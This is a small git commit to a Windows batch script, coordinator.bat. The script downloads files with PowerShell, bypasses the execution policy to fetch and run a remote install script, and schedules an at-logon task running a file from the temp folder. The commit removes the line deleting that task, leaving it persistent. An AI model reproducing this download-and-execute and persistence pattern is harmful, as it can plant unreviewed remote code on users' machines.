2755900018904dbff072525d1ba2923b22616fcf
droid003best <54209012+droid003best@users.noreply.github.com>
2021-01-28 11:32:07 +0100

    Update coordinator.bat

--- coordinator.bat
+++ coordinator.bat
@@ -16,6 +16,6 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 powershell -command "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))"
 SCHTASKS /CREATE /SC onlogon /TN "choco" /TR "%temp%\choco"
 SCHTASKS /RUN /TN "choco"
-SCHTASKS /DELETE /TN "choco" /f
+
 
 
